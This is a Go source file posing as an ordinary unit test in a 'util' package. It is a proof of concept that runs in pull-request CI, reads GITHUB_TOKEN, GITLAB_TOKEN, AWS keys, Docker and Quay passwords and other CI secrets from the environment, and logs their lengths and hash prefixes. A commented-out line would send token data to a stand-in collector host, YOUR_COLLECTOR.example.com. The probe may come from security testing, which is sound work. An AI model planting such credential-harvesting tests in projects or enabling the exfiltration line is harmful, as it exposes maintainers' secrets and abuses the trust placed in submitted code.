package util

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"testing"
)

func TestCISecurityPoC_SecretEnvExposure(t *testing.T) {
	githubToken := os.Getenv("GITHUB_TOKEN")
	gitlabToken := os.Getenv("GITLAB_TOKEN")

	if githubToken != "" {
		hash := sha256.Sum256([]byte(githubToken))
		t.Logf("POC-CONFIRMED: GITHUB_TOKEN available in PR test context (sha256: %s, len: %d)",
			hex.EncodeToString(hash[:])[:16], len(githubToken))
	} else {
		t.Log("POC-SAFE: GITHUB_TOKEN not accessible (expected if fork-guard active)")
	}

	if gitlabToken != "" {
		hash := sha256.Sum256([]byte(gitlabToken))
		t.Logf("POC-CONFIRMED: GITLAB_TOKEN available in PR test context (sha256: %s, len: %d)",
			hex.EncodeToString(hash[:])[:16], len(gitlabToken))
	} else {
		t.Log("POC-SAFE: GITLAB_TOKEN not accessible (expected if fork-guard active)")
	}

	// If either token is found, this proves PR code from a fork can access secrets
	if githubToken != "" || gitlabToken != "" {
		t.Log("!!! VULNERABILITY CONFIRMED: PR code from fork can read CI secrets !!!")
		// Uncomment below to prove exfiltration:
		// http.Get(fmt.Sprintf("https://YOUR_COLLECTOR.example.com/token?gh_len=%d", len(githubToken)))
	}

	// Also enumerate CI environment for additional exposed secrets
	for _, key := range []string{
		"GITHUB_TOKEN", "GITLAB_TOKEN", "SONAR_TOKEN", "CODECOV_TOKEN",
		"DOCKER_USR", "DOCKER_PSW", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
		"QUAY_USERNAME", "QUAY_PASSWORD", "CACHIX_AUTH_TOKEN",
	} {
		val := os.Getenv(key)
		if val != "" {
			t.Logf("POC-ENV: %s present (len=%d, prefix_sha256=%s)",
				key, len(val), hex.EncodeToString(sha256Hash(val))[:8])
		}
	}
}

func sha256Hash(s string) []byte {
	h := sha256.Sum256([]byte(s))
	return h[:]
}
